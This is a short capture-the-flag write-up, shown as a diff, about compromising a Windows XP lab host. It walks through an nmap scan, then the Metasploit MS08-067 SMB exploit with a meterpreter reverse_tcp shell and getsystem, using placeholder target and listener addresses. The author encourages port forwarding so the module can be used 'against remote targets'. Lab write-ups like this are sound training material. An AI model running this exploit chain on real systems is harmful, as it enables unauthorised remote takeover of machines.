@@ -1,0 +1,104 @@
+Windows XP Pro 01
+Time taken: ~ 20 minutes (lololol)
+
+I've always wanted to break into a windows machine...
+
+NOTE: YOU MUST SET UP PORT FORWARDING FOR METASPLOIT MODULES 
+TO WORK REMOTELY OVER THE INTERNET. I HIGHLY RECOMMEND YOU DO THIS,
+AS IT GIVES YOU A VERY POWERFUL TOOL TO USE AGAINST REMOTE TARGETS
+
+alright. nmap to the rescue:
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-10 16:27 MDT
+Nmap scan report for ctf08.root-me.org (212.129.39.172)
+Host is up (0.069s latency).
+rDNS record for 212.129.39.172: 212-129-39-172.rev.poneytelecom.eu
+Not shown: 996 closed ports
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH 5.4 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 84:44:5e:82:81:5d:0a:7e:17:b6:97:d5:fa:9b:6e:04 (DSA)
+|_  2048 47:f9:10:ea:ab:e2:bd:1b:b7:4c:09:84:a7:7b:eb:2f (RSA)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Windows XP netbios-ssn
+
+445/tcp 	open 				Microsoft SMB
+
+3389/tcp open  ms-wbt-server Microsoft Terminal Service
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: VICTIM-5892C079, NetBIOS user: <unknown>, NetBIOS MAC: 00:00:00:00:00:08 (Xerox)
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: victim-5892c079
+|   NetBIOS computer name: VICTIM-5892C079\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2017-05-11T00:27:52+02:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server doesn't support SMBv2 protocol
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.25 ms 10.0.2.2
+2   0.43 ms 212-129-39-172.rev.poneytelecom.eu (212.129.39.172)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 90.31 seconds
+
+NETBIOS:
+
+212.129.39.172 [VICTIM-5892C079] OS:Windows Names:(VICTIM-5892C079, WORKGROUP, __MSBROWSE__) Addresses:(10.66.8.100) Mac:00:00:00:00:00:08 
+
+hmm... looks like it's asking for it with SMB open on port 445...
+
+METASPLOIT TIME:
+
+msf > use exploit/windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(ms08_067_netapi) > set RHOST (TARGET IP)
+RHOST => (TARGET IP)
+msf exploit(ms08_067_netapi) > set LHOST (YOUR PUBLIC IP)
+LHOST => (YOUR PUBLIC IP)
+msf exploit(ms08_067_netapi) > set ReverseListenerBindAddress ( YOUR LOCAL IP)
+ReverseListenerBindAddress => ( YOUR LOCAL IP)
+msf exploit(ms08_067_netapi) > show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    111.111.111.111  yes       The target address
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting   Required  Description
+   ----      ---------------   --------  -----------
+   EXITFUNC  thread            yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     (YOUR PUBLIC IP)  yes       The listen address
+   LPORT     4444              yes       The listen port
+
+msf exploit(ms08_067_netapi) > exploit
+
+.
+.
+.
+
+meterpreter > getsystem
+
+DONE. that was easier than expected
+
+
+
